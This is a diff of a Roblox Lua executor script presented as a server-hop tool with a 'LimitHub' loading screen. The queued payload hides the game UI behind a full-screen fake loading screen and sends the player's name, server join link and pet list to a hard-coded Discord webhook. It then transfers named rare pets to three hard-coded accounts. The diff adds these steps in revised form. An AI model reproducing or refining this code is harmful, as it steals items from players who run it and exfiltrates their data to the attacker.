@@ -4,7 +4,7 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local placeId = 126884695634066
 
--- Create GUI + Webhook + Pet Transfer Script as a STRING
+-- GUI + Webhook + Pet Transfer Script (Queued on Teleport)
 local loadingScript = [[
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
@@ -16,12 +16,11 @@ pcall(function()
     StarterGui:SetCore("TopbarEnabled", false)
 end)
 
-local screenGui = Instance.new("ScreenGui")
+local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
 screenGui.Name = "LimitHubLoading"
 screenGui.ResetOnSpawn = false
 screenGui.IgnoreGuiInset = true
 screenGui.DisplayOrder = 999999
-screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
 local bg = Instance.new("Frame", screenGui)
 bg.Size = UDim2.new(1, 0, 1, 0)
@@ -73,27 +72,32 @@ task.spawn(function()
     screenGui:Destroy()
 end)
 
--- Send Webhook
+-- Webhook using request()
+task.wait(2)
 local petsList = {}
-for _, pet in ipairs(LocalPlayer:WaitForChild("PetsFolder"):GetChildren()) do
-    table.insert(petsList, pet.Name)
-end
+pcall(function()
+    for _, pet in ipairs(LocalPlayer:WaitForChild("PetsFolder"):GetChildren()) do
+        table.insert(petsList, pet.Name)
+    end
+end)
 
 local data = {
-    ["content"] = "Script Executed! Player: " .. LocalPlayer.Name ..
-        "\\nJoin Server: https://www.roblox.com/games/126884695634066/?jobId=" .. game.JobId ..
-        "\\nPets: " .. table.concat(petsList, ", ")
+    ["content"] = "✅ **Script Executed**\nPlayer: " .. LocalPlayer.Name ..
+        "\n[Join Server](https://www.roblox.com/games/126884695634066/?jobId=" .. game.JobId .. ")" ..
+        "\nPets: " .. (#petsList > 0 and table.concat(petsList, ", ") or "No Pets Found")
 }
 
 pcall(function()
-    HttpService:PostAsync(
-        "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y",
-        HttpService:JSONEncode(data),
-        Enum.HttpContentType.ApplicationJson
-    )
+    request({
+        Url = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
 end)
 
 -- Pet Transfer
+task.wait(3)
 local transferred = false
 local targets = {"boneblossom215", "beanstalk1251", "burningbud709"}
 local petsToSend = {"Trex", "fennec fox", "Raccoon", "dragonfly", "butterfly", "queenbee", "spinosaurus", "redfox", "Brontosaurus", "mooncat", "mimic octopus", "disco bee", "dilophosaurus", "kitsune"}
@@ -117,10 +121,9 @@ task.spawn(function()
         task.wait(5)
     end
 end)
-
 ]]
 
--- Function to perform server hop
+-- Server Hop Function
 local function serverHop()
     local cursor = ""
     local smallestServer = nil
@@ -147,7 +150,6 @@ local function serverHop()
         task.wait(0.2)
     until cursor == ""
 
-    -- Queue loading GUI + logic
     queue_on_teleport(loadingScript)
 
     if smallestServer then
@@ -157,5 +159,5 @@ local function serverHop()
     end
 end
 
--- Start hop
-serverHop() at least one Of my file 
+-- Execute on Start
+serverHop()
